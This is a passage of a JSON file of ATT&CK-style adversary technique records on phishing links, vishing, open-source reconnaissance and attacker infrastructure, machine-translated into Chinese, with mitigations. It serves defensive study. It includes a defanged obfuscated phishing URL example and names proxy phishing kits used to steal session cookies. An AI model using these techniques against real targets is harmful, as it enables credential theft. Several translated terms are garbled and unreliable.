          "content": "各种形式的矛盾形式都是针对特定个人，公司或行业的以电子方式交付的社会工程。在这种情况下，恶意电子邮件通常包含链接，通常伴随着社会工程文本，以哄骗用户积极单击或复制URL并将URL粘贴到浏览器中。给定的网站可能是合法网站（例如在线或公司登录门户）的克隆，或者可能非常类似于合法网站，并且具有来自真实网站的元素的URL。也可以通过利用URL架构中的怪癖来使URL变得混淆，例如接受基于整数或十六进制的主机名格式，以及在“@”符号之前自动丢弃文本：例如，"
        },
        {
          "type": "code",
          "content": " hxxp：///google.com@1157586937 "
        },
        {
          "type": "text",
          "content": "。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手也可以链接到网络钓鱼消息中的“ Web错误”或“ Web Beacons”，以验证收到电子邮件，同时也有可能分析和跟踪受害者信息（例如IP地址）。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手也可以使用所谓的“浏览器浏览器”（BITB）攻击来欺骗一个完整的网站。通过使用基于HTML的地址栏生成一个假浏览器弹出窗口，该窗口似乎包含合法的URL（例如身份验证门户），他们可以提示用户在绕过典型的URL验证方法时输入其凭据。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以使用网络钓鱼套件，例如"
        },
        {
          "type": "code",
          "content": " Evilproxy "
        },
        {
          "type": "text",
          "content": "和"
        },
        {
          "type": "code",
          "content": " evilginx2 "
        },
        {
          "type": "text",
          "content": "来代理受害者与合法网站之间的连接。在成功的登录中，受害者被重定向到合法网站，而对手除了用户名和密码外，还捕获了他们的会话cookie（即窃取Web Session cookie）。这可能使对手能够通过Web Session Cookie绕过MFA。"
        }
      ],
      [
        {
          "type": "text",
          "content": "从假网站上，信息以网络表格收集并发送给对手。对手还可以使用以前的侦察工作中的信息（例如：搜索开放网站/域名或搜索受害者拥有的网站）来制作有说服力和可信的诱饵。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1054",
        "name": "软件配置",
        "description": [
          [
            {
              "type": "text",
              "content": "使用反企业和电子邮件身份验证机制根据发件人域（使用SPF）的有效性检查和消息完整性（使用DKIM）过滤消息。在组织中启用这些机制（通过诸如DMARC之类的策略）可以使接收者（Intra-Org和Cross域）执行类似的消息过滤和验证。"
            }
          ],
          [
            {
              "type": "text",
              "content": "此外，策略可以强制执行 /安装浏览器扩展程序，以防止IDN和同型攻击。当URL与原始合法站点匹配时，浏览器密码管理器还可以配置为仅填充凭据字段。"
            }
          ]
        ]
      },
      {
        "id": "M1017",
        "name": "用户培训",
        "description": [
          [
            {
              "type": "text",
              "content": "可以培训用户以识别社会工程技术和矛盾的尝试。此外，用户可以对他们访问的域进行视觉检查；但是，ASCII和IDN域中的同符和URL模式混淆可能会使手动检查变得困难。网络钓鱼培训和其他网络安全培训可能会在访问网站之前提高对URL的认识。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1598.004",
    "name": "Spearphishing Voice",
    "tactics": [
      {
        "id": "TA0043",
        "name": "Reconnaissance"
      }
    ],
    "technique": "Phishing for Information",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以使用语音通信来获取目标在定位过程中可以使用的敏感信息。spearphening for信息是试图将目标欺骗到泄露信息，经常凭据或其他可操作的信息。信息待钓鱼经常涉及社会工程技术，例如摆姿势作为收集信息的理由（例如：模仿）和/或为接收者产生紧迫感或警报的理由。"
        }
      ],
      [
        {
          "type": "text",
          "content": "所有形式的网络钓鱼都是电子交付的社会工程。在这种情况下，对手使用电话来获取受害者的敏感信息。这些通信被称为“语音网络钓鱼”（或“ Vishing”），可以由对手，雇用的呼叫中心甚至通过Robocalls自动执行。语音网络钓鱼者可能会欺骗他们的电话号码，同时也冒充可信赖的实体，例如业务伙伴或技术支持人员。"
        }
      ],
      [
        {
          "type": "text",
          "content": "受害者还可能收到网络钓鱼消息，指导他们拨打电话号码（“回调网络钓鱼”），对手试图收集机密信息。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手还可以使用以前的侦察工作中的信息（例如：搜索开放网站/域名或搜索受害者拥有的网站）来量身定制借口，以使受害者更具说服力和可信度。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1017",
        "name": "用户培训",
        "description": [
          [
            {
              "type": "text",
              "content": "可以对用户进行培训，以识别和报告社会工程技术和长矛网络钓鱼尝试，同时也对呼叫者的身份感到怀疑和验证。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1597.001",
    "name": "Threat Intel Vendors",
    "tactics": [
      {
        "id": "TA0043",
        "name": "Reconnaissance"
      }
    ],
    "technique": "Search Closed Sources",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以从威胁情报供应商中搜索私人数据以获取可以在定位过程中使用的信息。威胁情报供应商可以提供付费供稿或门户网站，这些供稿或门户网站提供的数据比公开报告的更多数据。尽管可以删除敏感的细节（例如客户名称和其他标识符），但此信息可能包含有关违规的趋势，例如目标行业，归因索赔和成功的TTP/对策。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以在私人威胁情报供应商数据中搜索以收集可行的信息。威胁行为者可能会寻求有关自己运动的信息/指标，以及其他可能与目标行业，能力/目标或其他运营问题保持一致的对手所进行的信息/指标。供应商报告的信息还可以揭示其他形式的侦察形式（例如：搜索开放网站/域），建立运营资源（例如：开发功能或获得功能）和/或初始访问远程服务）。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1056",
        "name": "前弹力",
        "description": [
          [
            {
              "type": "text",
              "content": "该技术无法通过预防控制措施轻松减轻，因为它基于在企业防御和控制范围之外执行的行为。努力应着重于最大程度地降低外部各方可用数据的数量和灵敏度。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1597.002",
    "name": "Purchase Technical Data",
    "tactics": [
      {
        "id": "TA0043",
        "name": "Reconnaissance"
      }
    ],
    "technique": "Search Closed Sources",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会购买有关目标在定位期间使用的受害者的技术信息。有关受害者的信息可以在信誉良好的私人资源和数据库中购买，例如扫描数据库或其他数据聚合服务的付费订阅。对手还可以从较言语的来源（例如黑网或网络犯罪黑市）那里购买信息。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以购买有关其已经确定的目标的信息，或使用购买的数据来发现成功违规的机会。威胁参与者可能会从购买的数据中收集各种技术细节，包括但不限于员工联系信息，证书或有关受害者基础设施的详细信息。来自这些来源的信息可能会揭示其他形式的侦察的机会（例如：信息网络钓鱼或搜索开放网站/域），建立运营资源（例如：开发功能或获得功能）和/或初始访问（例如：外部远程服务：或有效帐户）。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1056",
        "name": "前弹力",
        "description": [
          [
            {
              "type": "text",
              "content": "该技术无法通过预防控制措施轻松减轻，因为它基于在企业防御和控制范围之外执行的行为。努力应着重于最大程度地降低外部各方可用数据的数量和灵敏度。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1596.001",
    "name": "DNS/Passive DNS",
    "tactics": [
      {
        "id": "TA0043",
        "name": "Reconnaissance"
      }
    ],
    "technique": "Search Open Technical Databases",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以搜索DNS数据以获取有关目标期间可以使用的受害者的信息。DNS信息可能包括各种详细信息，包括注册的名称服务器以及概述针对目标子域，邮件服务器和其他主机的记录。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以搜索DNS数据以收集可行的信息。威胁参与者可以直接查询名称服务器，或通过已记录的DNS查询响应（称为被动DNS）的集中存储库进行搜索。对手也可能会寻找并针对DNS的错误配置/泄漏，以揭示有关内部网络的信息。来自这些来源的信息可能会揭示其他形式的侦察的机会（例如：搜索受害者拥有的网站或搜索开放网站/域），建立运营资源（例如：获得基础架构或妥协基础架构）和/或初始访问（例如：外部：外部：远程服务或可信赖的关系）。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1056",
        "name": "前弹力",
        "description": [
          [
            {
              "type": "text",
              "content": "该技术无法通过预防控制措施轻松减轻，因为它基于在企业防御和控制范围之外执行的行为。努力应着重于最大程度地降低外部各方可用数据的数量和灵敏度。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1596.002",
    "name": "WHOIS",
    "tactics": [
      {
        "id": "TA0043",
        "name": "Reconnaissance"
      }
    ],
    "technique": "Search Open Technical Databases",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以搜索公众WHOIS数据以获取有关目标期间可以使用的受害者的信息。WHOIS数据由负责分配和分配Internet资源（例如域名）的区域互联网注册表（RIR）存储。任何人都可以查询WHOIS服务器中有关注册域的信息，例如分配的IP块，联系信息和DNS名称服务器。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以搜索WHOIS数据以收集可行的信息。威胁参与者可以使用在线资源或命令行实用程序通过WHOIS数据掠夺有关潜在受害者的信息。来自这些来源的信息可能会揭示其他形式的侦察的机会（例如：主动扫描或信息钓鱼），建立运营资源（例如：获得基础架构或妥协基础架构）和/或初始访问（例如：外部远程服务或受信任的关系或可信赖的关系）。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1056",
        "name": "前弹力",
        "description": [
          [
            {
              "type": "text",
              "content": "该技术无法通过预防控制措施轻松减轻，因为它基于在企业防御和控制范围之外执行的行为。努力应着重于最大程度地降低外部各方可用数据的数量和灵敏度。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1596.003",
    "name": "Digital Certificates",
    "tactics": [
      {
        "id": "TA0043",
        "name": "Reconnaissance"
      }
    ],
    "technique": "Search Open Technical Databases",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以搜索公共数字证书数据以获取有关目标期间可以使用的受害者的信息。数字证书由证书机构（CA）颁发，以便在密码上验证签名内容的起源。这些证书，例如用于加密Web流量（HTTPS SSL/TLS通信）的证书，其中包含有关注册组织的信息，例如名称和位置。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以搜索数字证书数据以收集可行的信息。威胁参与者可以使用在线资源和查找工具来收集有关证书的信息。还可以从组织签署的工件中获得数字证书数据（EX：来自加密的Web流量使用的证书）。来自这些来源的信息可能会揭示其他形式的侦察的机会（例如：主动扫描或信息钓鱼），建立运营资源（例如：开发能力或获得功能）和/或初始访问（例如：外部远程服务或受信任的关系）。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1056",
        "name": "前弹力",
        "description": [
          [
            {
              "type": "text",
              "content": "该技术无法通过预防控制措施轻松减轻，因为它基于在企业防御和控制范围之外执行的行为。努力应着重于最大程度地降低外部各方可用数据的数量和灵敏度。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1596.004",
    "name": "CDNs",
    "tactics": [
      {
        "id": "TA0043",
        "name": "Reconnaissance"
      }
    ],
    "technique": "Search Open Technical Databases",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以搜索有关目标在目标过程中可以使用的受害者的数据传递网络（CDN）数据。CDN允许组织从分布式负载平衡的服务器托管内容。CDN还可以允许组织根据请求者的地理区域自定义内容交付。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以搜索CDN数据以收集可行的信息。威胁参与者可以使用在线资源和查找工具来收集有关CDN中内容服务器的信息。对手还可以寻求和针对CDN错误配置，以泄漏敏感的信息不打算托管和/或没有与组织网站上托管的内容相同的保护机制（例如：ex：登录门户）。来自这些来源的信息可能会揭示其他形式的侦察的机会（例如：主动扫描或搜索开放网站/域），建立运营资源（例如：获得基础架构或妥协基础架构）和/或初始访问（例如：驱动器：驱动器：）。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1056",
        "name": "前弹力",
        "description": [
          [
            {
              "type": "text",
              "content": "该技术无法通过预防控制措施轻松减轻，因为它基于在企业防御和控制范围之外执行的行为。努力应着重于最大程度地降低外部各方可用数据的数量和灵敏度。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1596.005",
    "name": "Scan Databases",
    "tactics": [
      {
        "id": "TA0043",
        "name": "Reconnaissance"
      }
    ],
    "technique": "Search Open Technical Databases",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以在公共扫描数据库中搜索有关目标在定位过程中可以使用的受害者的信息。各种在线服务不断发布Internet扫描/调查的结果，通常会收集活动信息，例如活动IP地址，主机名，开放端口，证书，甚至服务器标语。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以搜索扫描数据库以收集可行的信息。威胁参与者可以使用在线资源和查找工具从这些服务中收集信息。对手可能会寻求有关其已经确定的目标的信息，或者使用这些数据集发现成功违规的机会。来自这些来源的信息可能会揭示其他形式的侦察的机会（例如：主动扫描或搜索打开的网站/域），建立运营资源（例如：开发功能或获得功能）和/或初始访问（例如：外部远程服务或外部远程服务或利用面向公共的申请）。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1056",
        "name": "前弹力",
        "description": [
          [
            {
              "type": "text",
              "content": "该技术无法通过预防控制措施轻松减轻，因为它基于在企业防御和控制范围之外执行的行为。努力应着重于最大程度地降低外部各方可用数据的数量和灵敏度。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1593.001",
    "name": "Social Media",
    "tactics": [
      {
        "id": "TA0043",
        "name": "Reconnaissance"
      }
    ],
    "technique": "Search Open Websites/Domains",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以搜索社交媒体以获取有关目标在目标过程中使用的信息的信息。社交媒体网站可能包含有关受害组织的各种信息，例如业务公告以及有关员工的角色，位置和利益的信息。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以根据他们寻求收集的信息在不同的社交媒体网站上搜索。威胁参与者可以被动地从这些站点收集数据，并使用收集的信息来创建伪造的个人资料/团体，以引起受害者揭示特定信息（即带状网钓服务）。来自这些来源的信息可能会揭示其他形式的侦察的机会（例如：信息或搜索开放技术数据库），建立运营资源（例如：建立帐户或折衷帐户）和/或初始访问（例如：通过服务：spearphending）。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1056",
        "name": "前弹力",
        "description": [
          [
            {
              "type": "text",
              "content": "该技术无法通过预防控制措施轻松减轻，因为它基于在企业防御和控制范围之外执行的行为。努力应着重于最大程度地降低外部各方可用数据的数量和灵敏度。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1593.002",
    "name": "Search Engines",
    "tactics": [
      {
        "id": "TA0043",
        "name": "Reconnaissance"
      }
    ],
    "technique": "Search Open Websites/Domains",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以使用搜索引擎收集有关目标期间可以使用的受害者的信息。搜索引擎服务典型的在线网站索引上下文，并可能为用户提供专门的语法，以搜索特定的关键字或特定类型的内容（即Filetypes）。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可能会根据他们寻求收集的信息来制作各种搜索引擎查询。威胁参与者可以使用搜索引擎收集有关受害者的一般信息，并使用专门查询来查找敏感信息的溢出/泄漏，例如网络详细信息或凭据。来自这些来源的信息可能会揭示其他形式的侦察的机会（例如：信息网络钓鱼或搜索开放技术数据库），建立运营资源（例如：建立帐户或妥协帐户）和/或初始访问（例如：有效帐户或网络钓鱼）。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1056",
        "name": "前弹力",
        "description": [
          [
            {
              "type": "text",
              "content": "该技术无法通过预防控制措施轻松减轻，因为它基于在企业防御和控制范围之外执行的行为。努力应着重于最大程度地降低外部各方可用数据的数量和灵敏度。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1593.003",
    "name": "Code Repositories",
    "tactics": [
      {
        "id": "TA0043",
        "name": "Reconnaissance"
      }
    ],
    "technique": "Search Open Websites/Domains",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以搜索公共代码存储库以获取有关目标期间可以使用的受害者的信息。受害者可以将代码存储在存储库中的各个第三方网站上，例如Github，Gitlab，SourceForge和Bitbucket。用户通常通过Web应用程序或命令行实用程序（例如GIT）与代码存储库进行交互。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以搜索各种公共代码存储库，以获取有关受害者的各种信息。公共代码存储库通常可以成为有关受害者的各种一般信息的来源，例如常用的编程语言和库以及员工的名称。对手还可以识别更灵敏的数据，包括意外泄漏的凭据或API密钥。来自这些来源的信息可能会揭示其他形式的侦察的机会（例如：信息网络钓鱼），建立运营资源（例如：妥协帐户或妥协基础架构）和/或初始访问（例如：有效的帐户或网络钓鱼）。"
        }
      ],
      [
        {
          "type": "text",
          "content": "注意：这与代码存储库不同，该代码存储库的重点是从私有和内部托管的代码存储库中的收集。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1013",
        "name": "应用程序开发人员指导",
        "description": [
          [
            {
              "type": "text",
              "content": "上传到公共代码存储库的应用程序开发人员应小心避免发布敏感信息，例如凭据和API密钥。"
            }
          ]
        ]
      },
      {
        "id": "M1047",
        "name": "审计",
        "description": [
          [
            {
              "type": "text",
              "content": "在提交之前，扫描公共代码存储库获取暴露的凭据或其他敏感信息。确保从提交历史记录中删除任何泄漏的凭据，而不仅仅是当前的代码最新版本。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1583.001",
    "name": "Domains",
    "tactics": [
      {
        "id": "TA0042",
        "name": "Resource Development"
      }
    ],
    "technique": "Acquire Infrastructure",
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会获取在目标期间可以使用的域。域名是用于表示一个或多个IP地址的人类名称。它们可以购买，或者在某些情况下免费获得。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以将获得的域用于多种目的，包括用于网络钓鱼，驱动折衷以及命令和控制。对手可以选择类似于合法域的域，包括使用同义或使用不同的顶级域（TLD）。可以使用打字机来帮助通过妥协交付有效载荷。对手还可以使用国际化域名（IDN）和不同的角色集（例如西里尔，希腊语等）执行“ IDN同型攻击”，从而创建用于将恶意软件传递到受害机器的视觉上相似的外观域。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手也可以获取并重新利用过期的域，这些领域可能已经根据现有的声誉/历史而被防御者允许/信任。"
        }
      ],
      [
        {
          "type": "text",
          "content": "域注册商每个人都维护一个可公开查看的数据库，该数据库显示每个注册域的联系信息。私人WHOIS服务显示替代信息，例如他们自己的公司数据，而不是域名。对手可以使用此类私人WHOIS服务来模糊有关谁拥有的域名的信息。对手可能会通过使用不同的注册信息和与不同域名注册商的购买域，进一步中断追踪其基础架构的努力。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1056",
        "name": "前弹力",
        "description": [
          [
            {
              "type": "text",
              "content": "组织可能会故意向其自己注册相似的域，以阻止对手创建错别字域。该技术的其他方面不能轻易通过预防控制措施来缓解，因为它基于在企业防御和控制范围之外执行的行为。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1583.002",
    "name": "DNS Server",
    "tactics": [
      {
        "id": "TA0042",
        "name": "Resource Development"
      }
    ],
    "technique": "Acquire Infrastructure",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以设置自己的域名系统（DNS）服务器，可以在定位期间使用。在副业后活动期间，对手可以将DNS流量用于各种任务，包括命令和控制（例如：应用程序层协议）。对手可以选择配置并运行自己的DNS服务器以支持操作，而不是劫持现有的DNS服务器。"
        }
      ],
      [
        {
          "type": "text",
          "content": "通过运行自己的DNS服务器，对手可以更好地控制他们如何管理服务器端DNS C2流量（DNS）。通过对DNS服务器的控制，对手可以配置DNS应用程序以提供对恶意软件的有条件响应，并且通常在基于DNS的C2 Channel的结构上具有更大的灵活性。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1056",
        "name": "前弹力",
        "description": [
          [
            {
              "type": "text",
              "content": "该技术无法通过预防控制措施轻松减轻，因为它基于在企业防御和控制范围之外执行的行为。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1583.003",
    "name": "Virtual Private Server",
    "tactics": [
      {
        "id": "TA0042",
        "name": "Resource Development"
      }
    ],
    "technique": "Acquire Infrastructure",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以租用目标期间可以使用的虚拟私人服务器（VPS）。有各种各样的云服务提供商将出售虚拟机/容器作为服务。通过利用VP，对手可以使他们很难将操作与他们进行物理联系起来。云基础架构的使用还可以使对手更容易快速提供，修改和关闭其基础架构。"
        }
      ],
      [
        {
          "type": "text",
          "content": "在对手生命周期的后期（例如命令和控制）中获取用于使用的VP，可以使对手从与更高声誉云服务提供商相关的无处不在和信任中受益。对手还可以从VPS服务提供商那里获取基础架构，这些提供商以使用最少的注册信息租用VPS而闻名，从而可以对基础架构进行更多的匿名收购。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1056",
        "name": "前弹力",
        "description": [
          [
            {
              "type": "text",
              "content": "该技术无法通过预防控制措施轻松减轻，因为它基于在企业防御和控制范围之外执行的行为。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1583.004",
    "name": "Server",
    "tactics": [
      {
        "id": "TA0042",
        "name": "Resource Development"
      }
    ],
    "technique": "Acquire Infrastructure",
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会购买，租赁或租用目标期间可以使用的物理服务器。使用服务器的使用使对手可以上台，启动和执行操作。在副业后活动期间，对手可以使用服务器进行各种任务，包括命令和控制。对手可能会使用Web服务器来支持支持浇水孔操作，例如在驱动器中或电子邮件服务器以支持网络钓鱼操作。对手无需损害第三方服务器或租用虚拟专用服务器，而是选择配置和运行自己的服务器以支持操作。"
        }
      ],
      [
        {
          "type": "text",
          "content": "当对手使用在线基础架构进行大多数活动时，可能只需要轻量级设置。或者，如果他们想在自己的系统上测试，交流和控制其活动的其他方面，他们可能需要建立广泛的基础设施。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1056",
        "name": "前弹力",
        "description": [
          [
            {
              "type": "text",
              "content": "该技术无法通过预防控制措施轻松减轻，因为它基于在企业防御和控制范围之外执行的行为。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1583.005",
    "name": "Botnet",
    "tactics": [
      {
        "id": "TA0042",
        "name": "Resource Development"
      }
    ],
    "technique": "Acquire Infrastructure",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会购买，租赁或租用可以在目标期间使用的折衷系统网络。僵尸网络是一个妥协的系统网络，可以指示执行协调的任务。对手可以购买订阅以使用靴子/压力器服务中现有的僵尸网络。借助僵尸网络，对手可以执行后续活动，例如大规模的网络钓鱼或分布式拒绝服务（DDOS）。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1056",
        "name": "前弹力",
        "description": [
          [
            {
              "type": "text",
              "content": "该技术无法通过预防控制措施轻松减轻，因为它基于在企业防御和控制范围之外执行的行为。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1583.006",
    "name": "Web Services",
    "tactics": [
      {
        "id": "TA0042",
        "name": "Resource Development"
      }
    ],
    "technique": "Acquire Infrastructure",
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以注册可以在目标期间使用的Web服务。存在各种流行的网站，以供对手注册基于Web的服务，该服务可能会在对手生命周期的后期滥用，例如命令和控制期间（Web服务），Web服务上的拆卸或网络钓鱼。使用常见服务（例如Google或Twitter提供的服务），使对手更容易隐藏在预期的噪音中。通过利用Web服务，对手可以使他们很难将操作与他们联系起来。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1056",
        "name": "前弹力",
        "description": [
          [
            {
              "type": "text",
              "content": "该技术无法通过预防控制措施轻松减轻，因为它基于在企业防御和控制范围之外执行的行为。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1583.007",
    "name": "Serverless",
    "tactics": [
      {
        "id": "TA0042",
        "name": "Resource Development"
      }
    ],
    "technique": "Acquire Infrastructure",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以购买和配置无服务器云基础架构，例如Cloudflare工人或AWS Lambda功能，可以在目标期间使用。通过利用无服务器基础结构，对手可以使操作过程中使用的基础架构更加困难。"
        }
      ],
      [
        {
          "type": "text",
          "content": "获取后，可以利用无服务器的运行时环境直接响应受感染的机器或委托对对手拥有的命令和控制服务器的委托。由于这些功能产生的流量似乎来自普通云提供商的子域，因此可能很难与普通流量区分开到这些提供商。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1056",
        "name": "前弹力",
        "description": [
          [
            {
              "type": "text",
              "content": "该技术无法通过预防控制措施轻松减轻，因为它基于在企业防御和控制范围之外执行的行为。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1583.008",
    "name": "Malvertising",
    "tactics": [
      {
        "id": "TA0042",
        "name": "Resource Development"
      }
    ],
    "technique": "Acquire Infrastructure",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会购买可以滥用的在线广告，以将恶意软件分发给受害者。可以购买广告以在线上购买并有利地定位文物，例如在搜索引擎结果中突出地放置在特定位置。这些广告可能使用户更难区分实际搜索结果和广告。购买的广告还可以使用广告网络的功能来针对特定的受众，这可能进一步利用固有的搜索引擎和流行网站的信任。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以购买广告和其他资源，以帮助向受害者分发包含恶意代码的文物。购买的广告可能会试图模仿或欺骗知名品牌。例如，这些欺骗性的广告可能会欺骗受害者单击广告，然后将其发送到一个恶意域，该域可能是包含广告软件的Trojanized版本的官方网站的克隆。对手创建恶意领域和购买广告的努力也可能会大规模自动化，以更好地抵制清理工作。"
        }
      ],
      [
        {
          "type": "text",
          "content": "恶意广告可用于支持驱动目标和驱动器妥协，如果AD包含感染目标系统的Web浏览器的代码/漏洞，则可能需要用户的互动有限。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手也可以采用几种技术来逃避广告网络的检测。例如，对手可能会动态路由广告单击，以将自动攻击者/策略执行器流量发送到良性站点，同时验证潜在目标，然后将来自真实广告单击的受害者发送到恶意页面。因此，该感染向量可能仍然隐藏在广告网络中，以及任何访问者都没有到达具有有效标识符的恶意网站，可以单击广告。其他技巧，例如避免品牌声誉监控的故意错别字，也可以用于逃避自动检测。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1056",
        "name": "前弹力",
        "description": [
          [
            {
              "type": "text",
              "content": "该技术无法通过预防控制措施轻松减轻，因为它基于在企业防御和控制范围之外执行的行为。努力应集中在初始访问活动上，例如通过折衷进行驱动器，在该活动中，广告阻止Adblockers可以帮助防止恶意代码执行。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1586.001",
    "name": "Social Media Accounts",
    "tactics": [
      {
        "id": "TA0042",
        "name": "Resource Development"
      }
    ],
    "technique": "Compromise Accounts",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会损害可以在定位期间使用的社交媒体帐户。对于结合社会工程的运营，在线角色的利用可能很重要。对手无需创建和培养社交媒体概况（即社交媒体帐户），而是会损害现有的社交媒体帐户。如果现有角色具有对受害者的关系或知识，则可能会对潜在受害者产生信任。"
        }
      ],
      [
        {
          "type": "text",
          "content": "存在多种方法来损害社交媒体帐户，例如通过网络钓鱼收集凭据，从第三方站点购买凭据或通过Brute强迫凭证（例如：从Breateach corlenty Dumps中重复使用密码）。在妥协社交媒体帐户之前，对手可能会进行侦察，以告知有关哪些帐户要妥协以进一步运作的决定。"
        }
      ],
      [
        {
          "type": "text",
          "content": "角色可能存在于单个站点或跨多个站点（例如：Facebook，LinkedIn，Twitter等）。受损的社交媒体帐户可能需要额外的开发，这可能包括填写或修改个人资料信息，进一步开发社交网络或合并照片。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以使用折衷的社交媒体个人资料来创建与感兴趣的目标的新的或劫持现有的联系。这些连接可能是直接的，也可能包括尝试通过其他人连接。在对手生命周期的其他阶段，例如在初始访问期间（例如：通过服务通过SpearPhishing），可以利用折衷的轮廓。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1056",
        "name": "前弹力",
        "description": [
          [
            {
              "type": "text",
              "content": "该技术无法通过预防控制措施轻松减轻，因为它基于在企业防御和控制范围之外执行的行为。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1586.002",
    "name": "Email Accounts",
    "tactics": [
      {
        "id": "TA0042",
        "name": "Resource Development"
      }
    ],
    "technique": "Compromise Accounts",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会损害可以在定位期间使用的电子邮件帐户。对手可以使用折衷的电子邮件帐户来进一步运营，例如利用他们进行网络钓鱼以获取信息，网络钓鱼或大规模垃圾邮件电子邮件活动。使用折衷的电子邮件帐户利用现有角色，如果与受损的角色有关系或知识，可能会对潜在受害者产生信任。折衷的电子邮件帐户也可以用于采集基础架构（例如：域）。"
        }
      ],
      [
        {
          "type": "text",
          "content": "是否存在各种方法来妥协电子邮件帐户，例如通过网络钓鱼收集凭据以获取信息，从第三方网站购买凭据，Brute强迫凭据（例如：从违规凭据转储中重新使用密码），或向员工，供应商或商业合作伙伴付款访问凭据。在妥协电子邮件帐户之前，对手可能会进行侦察，以告知有关哪些帐户要妥协以进一步运营的决定。对手可能会针对损害众所周知的电子邮件帐户或恶意垃圾邮件或网络钓鱼电子邮件可能逃避基于声誉的电子邮件过滤规则的域。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以将折磨的电子邮件帐户使用带有感兴趣的目标的劫持现有电子邮件线程。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1056",
        "name": "前弹力",
        "description": [
          [
            {
              "type": "text",
              "content": "该技术无法通过预防控制措施轻松减轻，因为它基于在企业防御和控制范围之外执行的行为。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1586.003",
    "name": "Cloud Accounts",
    "tactics": [
      {
        "id": "TA0042",
